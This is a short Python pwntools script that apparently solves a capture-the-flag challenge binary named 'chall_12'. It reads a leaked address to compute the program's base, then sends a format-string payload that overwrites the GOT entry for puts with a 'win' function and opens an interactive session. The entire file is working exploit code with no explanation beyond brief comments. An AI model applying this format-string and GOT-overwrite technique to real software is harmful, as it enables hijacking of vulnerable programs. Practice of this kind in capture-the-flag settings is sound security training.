import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_12")

p = pwn.process(elf.path)

# get address
p.recvuntil(b"Sometimes life gets hard, here's some help: ")
output = p.recv()
addr = int(output, 16) - elf.sym.main
elf.address = addr
print(f"address acquired: {elf.address}")

offset = 7
payload = pwn.fmtstr_payload(offset,{elf.got.puts:elf.sym.win}) # same payload as chall_11

p.sendline(payload)

p.interactive()